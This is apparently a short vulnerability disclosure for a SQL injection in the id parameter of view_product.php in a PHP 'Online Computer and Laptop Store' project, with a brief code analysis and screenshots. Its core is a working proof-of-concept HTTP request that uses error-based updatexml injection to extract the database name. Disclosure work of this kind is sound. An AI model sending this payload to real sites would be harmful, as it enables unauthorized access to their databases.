Online Computer and Laptop Store has a front-end SQL injection vulnerability

version:v2021

download:https://www.sourcecodester.com/php/16397/online-computer-and-laptop-store-using-php-and-mysql-source-code-free-download.html

route:/view_product.php

code analysis：
The id parameter is controllable and can be directly brought into the SQL statement for execution.
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/547c0e90-6f57-4b11-97c4-3edd148582f0)

Vulnerability recurrence
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/c27d3643-1280-4a22-b6d4-c9a6176734c8)

POC
```
GET /php-ocls/?p=view_product&id=c4ca4238a0b923820dcc509a6f75849b%27%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=tva7iboh7p2cghihuds4n016ie
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 192.168.1.23
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/46b10ed2-96fe-432e-8d0c-ae6596cfa913)
